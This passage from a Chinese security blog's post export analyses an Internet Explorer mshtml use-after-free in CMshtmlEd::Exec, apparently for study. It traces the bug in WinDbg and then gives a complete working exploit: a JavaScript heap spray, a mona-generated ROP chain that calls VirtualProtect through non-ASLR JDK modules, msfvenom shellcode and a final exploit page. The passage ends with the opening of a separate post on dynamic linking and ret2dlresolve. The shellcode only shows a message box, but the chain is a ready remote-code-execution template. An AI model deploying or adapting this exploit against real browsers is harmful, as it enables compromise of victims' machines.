+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0:005&gt; bp mshtml!CMshtmlEd::Exec	&#x2F;&#x2F;漏洞函数</span><br><span class="line">0:005&gt; g</span><br><span class="line">0:005&gt; bp mshtml!CMshtmlEd::Release</span><br></pre></td></tr></table></figure>
+
+<p>运行到漏洞函数CMshtmlEd::Exec时设置CMshtmlEd::Release断点，第一次执行到Release函数没有跳转执行free，第二次执行时调用了free函数</p>
+<img src="https://i.loli.net/2021/04/28/uN9TgrlI4yxdmDZ.png" style="zoom:80%;" />
+
+<img src="https://i.loli.net/2021/04/28/ct5nWfCd1Eob4PO.png" style="zoom:80%;" />
+
+<p>查看HeapFree函数的参数，第三个为this指针08178f78</p>
+<img src="https://i.loli.net/2021/04/28/SdsWlFMjyxHivIN.png" style="zoom:80%;" />
+
+<p>继续执行之后就触发了异常，同时edi也是08178f78，与被free掉的this指针相同，说明this指针在被释放后了又进行引用导致UAF漏洞</p>
+<img src="https://i.loli.net/2021/04/28/6eS9yAYkmXWMHna.png" style="zoom:80%;" />
+
+<p>那么，CMshtmlEd::Release的调用在漏洞函数CMshtmlEd::Exec哪里执行呢，查看CMshtmlEd::Exec，在漏洞触发点mov edi, dword ptr [edi+8]之前存在一个函数CCommand::Exec，需要使用edi指针，为什么执行之后就忽然edi指向的实例不存在了？</p>
+<img src="https://i.loli.net/2021/04/28/AHsRySzUPcvexgI.png" style="zoom:80%;" />
+
+<p>执行CCommamd::Exec之前查看edi</p>
+<img src="https://i.loli.net/2021/04/28/jTlKouQhUiGxEkL.png" style="zoom:80%;" />
+
+<p>执行之后，edi指向的this指针已经被free掉了，之后执行mov edi, dword ptr [edi+8]，导致异常。</p>
+<img src="https://i.loli.net/2021/04/28/jYK9ySC1wMVxU6O.png" style="zoom:80%;" />
+
+<p>验证：执行到CMshtmlEd::Exec时下断点mshtml!CMshtmlEd::Release和mshtml!CCommand::Exec，程序先后在CCommand::Exec和CMshtmlEd::Release断下，并执行了Heapfree函数，说明CCommand::Exec中释放了this指针</p>
+<h4 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h4><p>windbg结合JavaScript调试，确定poc何处引发漏洞</p>
+<p>查看CMshtmlEd实例的构造和释放过程，在IDA中查看CMshtmlEd::CMshtmlEd的引用函数AddCommandTarget和GetCommandTarget，都在分配了堆之后调用了CMshtmlEd的构造函数，所以关注构造函数就能直到堆的引用过程</p>
+<p>AddCommandTarget函数</p>
+<img src="https://i.loli.net/2021/04/28/nw7hlSOz1KsMgE6.png" style="zoom:80%;" />
+
+<p>GetCommandTarget函数</p>
+<img src="https://i.loli.net/2021/04/28/anQizWKlIpcxY2b.png" style="zoom:80%;" />
+
+<p>在构造函数和release函数下断点</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bp mshtml!CMshtmlEd::CMshtmlEd</span><br><span class="line">bp mshtml!CMshtmlEd::Release</span><br></pre></td></tr></table></figure>
+
+<p>执行funcB()时命中构造函数，查看函数参数this指针，这里由edx保存，堆为bb9af78</p>
+<img src="https://i.loli.net/2021/04/28/Ltxey6du1UwNY8b.png" style="zoom:80%;" />
+
+<p>继续执行第二次命中构造函数，创建堆9e52f78</p>
+<img src="https://i.loli.net/2021/04/28/FBZma8v15jWzTGl.png" style="zoom:80%;" />
+
+<p>之后命中release，没有调用heapfree，然后执行funcA()</p>
+<img src="https://i.loli.net/2021/04/28/IszAXy1kEKHTWUq.png" style="zoom:80%;" />
+
+<p>命中release，没有调用heapfree，又一次命中release，可以看到这里释放的堆为9e52f78</p>
+<img src="https://i.loli.net/2021/04/28/wQJT75BWpPqt9l2.png" style="zoom:80%;" />
+
+<p>然后引发了一个奇怪的异常，可能是由于JavaScript调试导致</p>
+<img src="https://i.loli.net/2021/04/28/vxizql73fILC9M6.png" style="zoom:80%;" />
+
+<p>不过可以确定时funcA()引起的，write常常会触发对象释放，后面对arrr[0].src赋值是一个占位动作</p>
+<img src="https://i.loli.net/2021/04/28/wRECpDSkes7JZGu.png" style="zoom:80%;" />
+
+
+
+<h2 id="四、漏洞利用"><a href="#四、漏洞利用" class="headerlink" title="四、漏洞利用"></a>四、漏洞利用</h2><h3 id="1-利用环境"><a href="#1-利用环境" class="headerlink" title="1. 利用环境"></a>1. 利用环境</h3><ul>
+<li><p>win7 sp1 x86</p>
+</li>
+<li><p>jdk1.6，其中MSVCR71.dll模块没有开启ASLR</p>
+</li>
+<li><p>kali2.0</p>
+</li>
+</ul>
+<h3 id="2-利用过程"><a href="#2-利用过程" class="headerlink" title="2. 利用过程"></a>2. 利用过程</h3><p>在CMshtmlEd对象被释放后，继续调用了vtable中的 [vtable + 8]函数，如果能够构造个虚假的地址将vtable占位，即可试下uaf利用。poc中parent.arrr[0]赋值实现了占位，程序，虚表指针edi+8指向了0c0c0c08</p>
+<img src="https://i.loli.net/2021/04/28/b26GFigtlxzZaJM.png" style="zoom:80%;" />
+
+<img src="https://i.loli.net/2021/04/28/ambqAG7OMvURsBS.png" style="zoom:80%;" />
+
+<p>接着运行程序，调用了[[edi]+8]，我们要向控制0c0c0c08处写入ROP和shellcode</p>
+<img src="https://i.loli.net/2021/04/28/soPnVDYWwrGvhdK.png" style="zoom:80%;" />
+
+<p>Heap Spray，利用JavaScript String对象在内存中申请大量的堆块，堆一直占用直到地址0c0c0c0c，同时每一个分配的堆块结构sildecode+shellcode，sildecode为nop等滑板指令，劫持程序执行流到任何一个堆块（本例为0c0c0c0c）中都能够执行shellcode，在win7等开启了DEP和ASLR的系统，要构造ROP调用VirtualProtect以关闭dep，而且ROP位置要精准</p>
+<p>为了实现shellcode精准到内存中指定位置：堆的大小和内部结构要非常精确，可以使用js的heaplib库，本次分析使用手动构造堆块。堆块进行分配的时候，因为堆块对齐，低4位10000大小的地址不会变化。举个例子，如果一个堆分配的低4位地址002c，那么其他堆的低位同为002c，只要以0x1000为单位进行构造堆块，那每个块结构机制都可轻易确定，如下图，low_offset固定，但high_offset不一定相同，当然每个shellcode块之间不能有空隙，不然会执行到0000的空隙字符</p>
+<img src="https://i.loli.net/2021/04/28/xJhtX1jDaR5OQyo.png" style="zoom:80%;" />
+
+<p>堆喷射代码，block结构，filler填充0020到0c0c到的内存，nop继续填充满1000字节</p>
+<img src="https://i.loli.net/2021/04/28/dZhWkiue2nczSoJ.png" style="zoom:80%;" />
+
+<p>分配200MB的block，4字节bstr头适应js的string对象，最后以2个字节结尾</p>
+<img src="https://i.loli.net/2021/04/28/BPsjkDhzIRu4LfM.png" style="zoom:80%;" />
+
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        <span class="keyword">var</span> arrr = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">        arrr[<span class="number">0</span>] = <span class="built_in">window</span>.document.createElement(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">        arrr[<span class="number">0</span>][<span class="string">&quot;src&quot;</span>] = <span class="string">&quot;E&quot;</span>;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">alloc</span>(<span class="params">len, str</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">while</span> (str.length &lt; len)</span><br><span class="line">                str += str;</span><br><span class="line">            <span class="keyword">return</span> str.substr(<span class="number">0</span>, (len - <span class="number">6</span>) / <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> block_size = <span class="number">0x1000</span> / <span class="number">2</span>; <span class="comment">//一页大小</span></span><br><span class="line">        <span class="keyword">var</span> offset = (<span class="number">0x0c0c</span> - <span class="number">0x0020</span> - <span class="number">4</span>) / <span class="number">2</span>; <span class="comment">// shellcode在块中的偏移</span></span><br><span class="line">        <span class="keyword">var</span> filler = <span class="built_in">unescape</span>(<span class="string">&quot;%u0c0c&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> (filler.length &lt; offset) &#123;</span><br><span class="line">            filler += filler;</span><br><span class="line">        &#125;</span><br><span class="line">        filler = filler.substring(<span class="number">0</span>, offset);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> shellcode = <span class="built_in">unescape</span>(<span class="string">&quot;%u7546%u7a7a%u5379&quot;</span> + <span class="string">&quot;%u6365%u7275%u7469&quot;</span> + <span class="string">&quot;%u9079&quot;</span>);<span class="comment">// FuzzySecurity的ascii，仅仅作为标识</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> nop = <span class="built_in">unescape</span>(<span class="string">&quot;%u9090&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; block_size; i++) &#123;</span><br><span class="line">            nop += <span class="built_in">unescape</span>(<span class="string">&quot;%u9090&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        nop = nop.substring(<span class="number">0</span>, block_size - shellcode.length - filler.length);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> block = filler + shellcode + nop;</span><br><span class="line">        block = alloc(<span class="number">0x100000</span>-<span class="number">0x10</span>, block);</span><br><span class="line">        len_block = block.length;</span><br><span class="line">        heap_chunks = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">150</span>; i++) &#123;</span><br><span class="line">            heap_chunks[i] = block.substr(<span class="number">0</span>, block.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line"></span><br><span class="line">    &lt;iframe src=<span class="string">&quot;../hpIpD0pjgv/UGuQTe.html&quot;</span>&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>堆内存，90000为!peb的得到的进程堆基址，堆占用了99.46，每块大小为ffff0</p>
+<img src="https://i.loli.net/2021/04/28/GarvRPtu5koDbmU.png" style="zoom:80%;" />
+
+<p>筛选大小为ffff0的堆块，可以看到每个堆块低位均为0020</p>
+<img src="https://i.loli.net/2021/04/28/yBTpPR8frbaq5xE.png" style="zoom:80%;" />
+
+<p>搜索shellcode “FuzzySecurity”，可以看到每个shellcode间隔为1000，正好为我们构造的block，一部分内存已被block铺满，没有空隙</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">s -a 0x00000000 L?7fffffff &quot;FuzzySecurity&quot;</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2021/04/28/FwXmCNbqUK2B5nO.png" style="zoom:80%;" />
+
+<p>构造ROP</p>
+<p>为了绕过win7的dep和ASLR，需要构造ROP调用VirtualProtect以关闭dep，win7浏览器会加载jdk1.6，其中有两个模块没有开启ASLR的模块，mona插件查询ROP</p>
+<img src="https://i.loli.net/2021/04/28/sj5zBXASwLkZTKe.png" style="zoom:80%;" />
+
+<p>自动生成ROP链，有问题需稍加修改，之后更改ROP以令程序执行call dword ptr [eax+8]时能够跳转到ROP，具体为迁移栈到0c0c0c0c</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">!py mona rop -m <span class="string">&quot;MSVCR71.dll, jp2ssv.dll&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//rop chain generated with mona.py - www.corelan.be</span></span><br><span class="line"><span class="keyword">var</span> rop_gadgets = <span class="built_in">unescape</span>(</span><br><span class="line">    <span class="string">&quot;%u5b4f%u7c36&quot;</span> + <span class="comment">// 0x7c365b4f : ,# POP EBX # POP EBP # RET [MSVCR71.dll]</span></span><br><span class="line">    <span class="string">&quot;%u0201%u0000&quot;</span> + <span class="comment">// 0x00000201 : ,# 0x00000201-&gt; ebx</span></span><br><span class="line">    <span class="string">&quot;%u8b05%u7c34&quot;</span> + <span class="comment">// 0x7c348b05: ,# XCHG EAX,ESP # RETN</span></span><br><span class="line">    <span class="string">&quot;&quot;</span> + <span class="comment">// #[---INFO:gadgets_to_set_ebp:---] :</span></span><br><span class="line">    <span class="string">&quot;%u6d28%u7c35&quot;</span> + <span class="comment">// 0x7c356d28 : ,# POP EBP # RETN [MSVCR71.dll]</span></span><br><span class="line">    <span class="string">&quot;%u6d28%u7c35&quot;</span> + <span class="comment">// 0x7c356d28 : ,# skip 4 bytes [MSVCR71.dll]</span></span><br><span class="line">    <span class="string">&quot;&quot;</span> + <span class="comment">// #[---INFO:gadgets_to_set_ebx:---] :</span></span><br><span class="line">    <span class="comment">// &quot;%u09cf%u7c36&quot; + // 0x7c3609cf : ,# POP EBX # RETN [MSVCR71.dll]</span></span><br><span class="line">    <span class="comment">// &quot;%u0201%u0000&quot; + // 0x00000201 : ,# 0x00000201-&gt; ebx</span></span><br><span class="line">    <span class="string">&quot;&quot;</span> + <span class="comment">// #[---INFO:gadgets_to_set_edx:---] :</span></span><br><span class="line">    <span class="string">&quot;%u4f8e%u7c34&quot;</span> + <span class="comment">// 0x7c344f8e : ,# POP EDX # RETN [MSVCR71.dll]</span></span><br><span class="line">    <span class="string">&quot;%u0040%u0000&quot;</span> + <span class="comment">// 0x00000040 : ,# 0x00000040-&gt; edx</span></span><br><span class="line">    <span class="string">&quot;&quot;</span> + <span class="comment">// #[---INFO:gadgets_to_set_ecx:---] :</span></span><br><span class="line">    <span class="string">&quot;%u8ab2%u7c35&quot;</span> + <span class="comment">// 0x7c358ab2 : ,# POP ECX # RETN [MSVCR71.dll]</span></span><br><span class="line">    <span class="string">&quot;%uf2a1%u7c38&quot;</span> + <span class="comment">// 0x7c38f2a1 : ,# &amp;Writable location [MSVCR71.dll]</span></span><br><span class="line">    <span class="string">&quot;&quot;</span> + <span class="comment">// #[---INFO:gadgets_to_set_edi:---] :</span></span><br><span class="line">    <span class="string">&quot;%ue239%u7c36&quot;</span> + <span class="comment">// 0x7c36e239 : ,# POP EDI # RETN [MSVCR71.dll]</span></span><br><span class="line">    <span class="string">&quot;%ud202%u7c34&quot;</span> + <span class="comment">// 0x7c34d202 : ,# RETN (ROP NOP) [MSVCR71.dll]</span></span><br><span class="line">    <span class="string">&quot;&quot;</span> + <span class="comment">// #[---INFO:gadgets_to_set_esi:---] :</span></span><br><span class="line">    <span class="string">&quot;%uf8f8%u7c34&quot;</span> + <span class="comment">// 0x7c34f8f8 : ,# POP ESI # RETN [MSVCR71.dll]</span></span><br><span class="line">    <span class="string">&quot;%u15a2%u7c34&quot;</span> + <span class="comment">// 0x7c3415a2 : ,# JMP [EAX] [MSVCR71.dll]</span></span><br><span class="line">    <span class="string">&quot;%u6747%u7c37&quot;</span> + <span class="comment">// 0x7c376747 : ,# POP EAX # RETN [MSVCR71.dll]</span></span><br><span class="line">    <span class="string">&quot;%ua151%u7c37&quot;</span> + <span class="comment">// 0x7c37a140 : ,# ptr to &amp;VirtualProtect() [IAT MSVCR71.dll]</span></span><br><span class="line">    <span class="string">&quot;&quot;</span> + <span class="comment">// #[---INFO:pushad:---] :</span></span><br><span class="line">    <span class="string">&quot;%u8c81%u7c37&quot;</span> + <span class="comment">// 0x7c378c81 : ,# PUSHAD # ADD AL,0EF # RETN [MSVCR71.dll]</span></span><br><span class="line">    <span class="string">&quot;&quot;</span> + <span class="comment">// #[---INFO:extras:---] :</span></span><br><span class="line">    <span class="string">&quot;%u5c30%u7c34&quot;</span> + <span class="comment">// 0x7c345c30 : ,# ptr to &#x27;push esp # ret &#x27; [MSVCR71.dll]</span></span><br><span class="line"><span class="string">&quot;&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>kali生成shellcode，以js小端序输出</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ msfvenom -p windows/messagebox -f js_le</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 272 bytes</span><br><span class="line">Final size of js_le file: 816 bytes</span><br><span class="line"><span class="meta">%</span><span class="bash">uebd9%ud99b%u2474%u31f4%ub2d2%u3177%u64c9%u718b%u8b30%u0c76%u768b%u8b1c%u0846%u7e8b%u8b20%u3836%u184f%uf375%u0159%uffd1%u60e1%u6c8b%u2424%u458b%u8b3c%u2854%u0178%u8bea%u184a%u5a8b%u0120%ue3eb%u4934%u348b%u018b%u31ee%u31ff%ufcc0%u84ac%u74c0%uc107%u0dcf%uc701%uf4eb%u7c3b%u2824%ue175%u5a8b%u0124%u66eb%u0c8b%u8b4b%u1c5a%ueb01%u048b%u018b%u89e8%u2444%u611c%ub2c3%u2908%u89d4%u89e5%u68c2%u4e8e%uec0e%ue852%uff9f%uffff%u4589%ubb04%ud87e%u73e2%u1c87%u5224%u8ee8%uffff%u89ff%u0845%u6c68%u206c%u6841%u3233%u642e%u7568%u6573%u3072%u88db%u245c%u890a%u56e6%u55ff%u8904%u50c2%ua8bb%u4da2%u87bc%u241c%ue852%uff5f%uffff%u6f68%u5878%u6820%u6761%u4265%u4d68%u7365%u3173%u88db%u245c%u890a%u68e3%u2058%u2020%u4d68%u4653%u6821%u6f72%u206d%u6f68%u202c%u6866%u6548%u6c6c%uc931%u4c88%u1024%ue189%ud231%u5352%u5251%ud0ff%uc031%uff50%u0855</span></span><br></pre></td></tr></table></figure>
+
+<p>最终exploit</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        <span class="keyword">var</span> arrr = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">        arrr[<span class="number">0</span>] = <span class="built_in">window</span>.document.createElement(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">        arrr[<span class="number">0</span>][<span class="string">&quot;src&quot;</span>] = <span class="string">&quot;E&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">alloc</span>(<span class="params">len, str</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">while</span> (str.length &lt; len)</span><br><span class="line">                str += str;</span><br><span class="line">            <span class="keyword">return</span> str.substr(<span class="number">0</span>, (len - <span class="number">6</span>) / <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> block_size = <span class="number">0x1000</span> / <span class="number">2</span>; <span class="comment">//一页大小</span></span><br><span class="line">        <span class="keyword">var</span> offset = (<span class="number">0x0c0c</span> - <span class="number">0x0020</span> - <span class="number">4</span>) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">var</span> filler = <span class="built_in">unescape</span>(<span class="string">&quot;%u0c0c&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> (filler.length &lt; offset) &#123;</span><br><span class="line">            filler += filler;</span><br><span class="line">        &#125;</span><br><span class="line">        filler = filler.substring(<span class="number">0</span>, offset);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// msfvenom -p windows/messagebox -f js_le</span></span><br><span class="line">        <span class="keyword">var</span> shellcode = <span class="built_in">unescape</span>(<span class="string">&quot;%uebd9%ud99b%u2474%u31f4%ub2d2%u3177%u64c9%u718b%u8b30%u0c76%u768b%u8b1c%u0846%u7e8b%u8b20%u3836%u184f%uf375%u0159%uffd1%u60e1%u6c8b%u2424%u458b%u8b3c%u2854%u0178%u8bea%u184a%u5a8b%u0120%ue3eb%u4934%u348b%u018b%u31ee%u31ff%ufcc0%u84ac%u74c0%uc107%u0dcf%uc701%uf4eb%u7c3b%u2824%ue175%u5a8b%u0124%u66eb%u0c8b%u8b4b%u1c5a%ueb01%u048b%u018b%u89e8%u2444%u611c%ub2c3%u2908%u89d4%u89e5%u68c2%u4e8e%uec0e%ue852%uff9f%uffff%u4589%ubb04%ud87e%u73e2%u1c87%u5224%u8ee8%uffff%u89ff%u0845%u6c68%u206c%u6841%u3233%u642e%u7568%u6573%u3072%u88db%u245c%u890a%u56e6%u55ff%u8904%u50c2%ua8bb%u4da2%u87bc%u241c%ue852%uff5f%uffff%u6f68%u5878%u6820%u6761%u4265%u4d68%u7365%u3173%u88db%u245c%u890a%u68e3%u2058%u2020%u4d68%u4653%u6821%u6f72%u206d%u6f68%u202c%u6866%u6548%u6c6c%uc931%u4c88%u1024%ue189%ud231%u5352%u5251%ud0ff%uc031%uff50%u0855&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//rop chain generated with mona.py - www.corelan.be</span></span><br><span class="line">        <span class="keyword">var</span> rop_gadgets = <span class="built_in">unescape</span>(</span><br><span class="line">            <span class="string">&quot;%u5b4f%u7c36&quot;</span> + <span class="comment">// 0x7c365b4f : ,# POP EBX # POP EBP # RET [MSVCR71.dll]</span></span><br><span class="line">            <span class="string">&quot;%u0201%u0000&quot;</span> + <span class="comment">// 0x00000201 : ,# 0x00000201-&gt; ebx</span></span><br><span class="line">            <span class="string">&quot;%u8b05%u7c34&quot;</span> + <span class="comment">// 0x7c348b05: ,# XCHG EAX,ESP # RETN</span></span><br><span class="line">            <span class="string">&quot;&quot;</span> + <span class="comment">// #[---INFO:gadgets_to_set_ebp:---] :</span></span><br><span class="line">            <span class="string">&quot;%u6d28%u7c35&quot;</span> + <span class="comment">// 0x7c356d28 : ,# POP EBP # RETN [MSVCR71.dll]</span></span><br><span class="line">            <span class="string">&quot;%u6d28%u7c35&quot;</span> + <span class="comment">// 0x7c356d28 : ,# skip 4 bytes [MSVCR71.dll]</span></span><br><span class="line">            <span class="string">&quot;&quot;</span> + <span class="comment">// #[---INFO:gadgets_to_set_ebx:---] :</span></span><br><span class="line">            <span class="comment">// &quot;%u09cf%u7c36&quot; + // 0x7c3609cf : ,# POP EBX # RETN [MSVCR71.dll]</span></span><br><span class="line">            <span class="comment">// &quot;%u0201%u0000&quot; + // 0x00000201 : ,# 0x00000201-&gt; ebx</span></span><br><span class="line">            <span class="string">&quot;&quot;</span> + <span class="comment">// #[---INFO:gadgets_to_set_edx:---] :</span></span><br><span class="line">            <span class="string">&quot;%u4f8e%u7c34&quot;</span> + <span class="comment">// 0x7c344f8e : ,# POP EDX # RETN [MSVCR71.dll]</span></span><br><span class="line">            <span class="string">&quot;%u0040%u0000&quot;</span> + <span class="comment">// 0x00000040 : ,# 0x00000040-&gt; edx</span></span><br><span class="line">            <span class="string">&quot;&quot;</span> + <span class="comment">// #[---INFO:gadgets_to_set_ecx:---] :</span></span><br><span class="line">            <span class="string">&quot;%u8ab2%u7c35&quot;</span> + <span class="comment">// 0x7c358ab2 : ,# POP ECX # RETN [MSVCR71.dll]</span></span><br><span class="line">            <span class="string">&quot;%uf2a1%u7c38&quot;</span> + <span class="comment">// 0x7c38f2a1 : ,# &amp;Writable location [MSVCR71.dll]</span></span><br><span class="line">            <span class="string">&quot;&quot;</span> + <span class="comment">// #[---INFO:gadgets_to_set_edi:---] :</span></span><br><span class="line">            <span class="string">&quot;%ue239%u7c36&quot;</span> + <span class="comment">// 0x7c36e239 : ,# POP EDI # RETN [MSVCR71.dll]</span></span><br><span class="line">            <span class="string">&quot;%ud202%u7c34&quot;</span> + <span class="comment">// 0x7c34d202 : ,# RETN (ROP NOP) [MSVCR71.dll]</span></span><br><span class="line">            <span class="string">&quot;&quot;</span> + <span class="comment">// #[---INFO:gadgets_to_set_esi:---] :</span></span><br><span class="line">            <span class="string">&quot;%uf8f8%u7c34&quot;</span> + <span class="comment">// 0x7c34f8f8 : ,# POP ESI # RETN [MSVCR71.dll]</span></span><br><span class="line">            <span class="string">&quot;%u15a2%u7c34&quot;</span> + <span class="comment">// 0x7c3415a2 : ,# JMP [EAX] [MSVCR71.dll]</span></span><br><span class="line">            <span class="string">&quot;%u6747%u7c37&quot;</span> + <span class="comment">// 0x7c376747 : ,# POP EAX # RETN [MSVCR71.dll]</span></span><br><span class="line">            <span class="string">&quot;%ua151%u7c37&quot;</span> + <span class="comment">// 0x7c37a140 : ,# ptr to &amp;VirtualProtect() [IAT MSVCR71.dll]</span></span><br><span class="line">            <span class="string">&quot;&quot;</span> + <span class="comment">// #[---INFO:pushad:---] :</span></span><br><span class="line">            <span class="string">&quot;%u8c81%u7c37&quot;</span> + <span class="comment">// 0x7c378c81 : ,# PUSHAD # ADD AL,0EF # RETN [MSVCR71.dll]</span></span><br><span class="line">            <span class="string">&quot;&quot;</span> + <span class="comment">// #[---INFO:extras:---] :</span></span><br><span class="line">            <span class="string">&quot;%u5c30%u7c34&quot;</span> + <span class="comment">// 0x7c345c30 : ,# ptr to &#x27;push esp # ret &#x27; [MSVCR71.dll]</span></span><br><span class="line">            <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> nop = <span class="built_in">unescape</span>(<span class="string">&quot;%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090&quot;</span>);</span><br><span class="line">        rop_gadgets += nop;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; block_size; i++)</span><br><span class="line">            nop += <span class="built_in">unescape</span>(<span class="string">&quot;%u9090&quot;</span>);</span><br><span class="line">        nop = nop.substring(<span class="number">0</span>, block_size - rop_gadgets.length - shellcode.length - filler.length);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> block = filler + rop_gadgets + shellcode + nop;</span><br><span class="line">        block = alloc(<span class="number">0xfffe0</span>, block);<span class="comment">//1MB堆内存</span></span><br><span class="line">        len_block = block.length;</span><br><span class="line">        heap_chunks = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">150</span>; i++)</span><br><span class="line">            heap_chunks[i] = block.substr(<span class="number">0</span>, block.length);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;iframe src=<span class="string">&quot;../hpIpD0pjgv/UGuQTe.html&quot;</span>&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2021/04/28/QvIqxhnyRTKB9e6.png" style="zoom:80%;" />
+
+<h2 id="五、参考文献"><a href="#五、参考文献" class="headerlink" title="五、参考文献"></a>五、参考文献</h2><ul>
+<li><a href="https://www.anquanke.com/post/id/85592">https://www.anquanke.com/post/id/85592</a></li>
+<li><a href="https://www.52pojie.cn/thread-596064-1-1.html">https://www.52pojie.cn/thread-596064-1-1.html</a></li>
+<li><a href="https://blog.csdn.net/qs_hud/article/details/9821735">https://blog.csdn.net/qs_hud/article/details/9821735</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>二进制安全</category>
+      </categories>
+      <tags>
+        <tag>漏洞分析</tag>
+        <tag>远程代码执行</tag>
+        <tag>UAF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>动态链接-ret2dlresolve</title>
+    <url>/2021/05/18/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5-ret2dlresolve/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>复习一下动态链接的全过程，通过plt和got的延迟绑定详细过程，彻底理解了ret2dlresolve</p>
+<span id="more"></span>
+
+<h1 id="链接器"><a href="#链接器" class="headerlink" title="链接器"></a>链接器</h1><p>链接器作用：符号解析和重定位</p>
+<ol>
+<li>符号解析：将可重定位目标文件里的的符号引用对应符号表里一个确定的符号定义相关联，符号定义以符号表的形式存储在对象文件，完成了符号解析，就能够确定每个符号的位置，完成了符号解析，就能够确定每个符号的位置</li>
+<li>重定位：<ul>
+<li>重定位节和符号定义：将所有同类的节合并成一个聚合节，并赋予聚合节以及每个定义的符号生成可执行文件最终运行时内存地址。这一步完成，每条指令和符号都有了唯一的运行时内存地址</li>
+<li>重定位符号引用：链接器修改节和数据节中对每个符号的引用，使其指向正确的运行时地址。为了确定每个节中需要修改的符号引用地址，需要参考重定位条目</li>
+</ul>
+</li>
+</ol>
+<h1 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h1><p>动态链接分为隐式链接和显式链接</p>
+<img src="https://i.loli.net/2021/05/18/YOFJqmD3vdfkrBw.png" style="zoom:80%;" />
+
+<ul>
+<li><p>load-time dynamic linking(加载时动态链接，隐式链接)</p>
+</li>
+<li><ul>
+<li>指程序载入内存时加载所需的动态链接库</li>
+<li>当创建可执行文件的时候，只链接一些重定位和符号表信息，使程序运行时可解析共享库。可执行文件加载时才由动态链接器真正完成动态链接过程</li>
+</ul>
+</li>
+<li><p>run-time dynamic linking(运行时动态链接，显式链接)</p>
+<ul>
+<li><p>动态链接库不随程序加载进内存，只在程序运行时调用相关的API而载入或释放</p>
+</li>
+<li><p>应用程序可能再他运行时要求加载和链接某个共享库，而无需再编译时链接到应用中</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>当共享库装载进内存时，动态链接器重定位共享库，并修改可执行文件中的GOT（延迟绑定），需要用到两个表PLT和GOT</p>
+<h1 id="PLT和GOT"><a href="#PLT和GOT" class="headerlink" title="PLT和GOT"></a>PLT和GOT</h1><ul>
+<li>PLT过程链接表，是一个由0x10大小条目组成的数组，<strong>每个条目负责调用一个具体的函数</strong>。从plt[1]开始的条目负责调用代码里共享库函数。plt[0]比较特殊，跳转到动态链接器装载函数实际地址到got表</li>
+<li>got全局偏移表，GOT是一个<strong>保存函数实际地址数组</strong>，从GOT[3]开始每项为内存中函数的实际地址。GOT[0]和GOT[1]是动态链接器解析函数地址时使用的信息，GOT[2]是动态链接器入口点<ul>
+<li>got[0]：可执行文件.dynamic地址</li>
+<li>got[1]：link_map结构地址</li>
+<li>got[2]：动态链接器_dl_runtime_resolve()地址</li>
+</ul>
+</li>
+</ul>
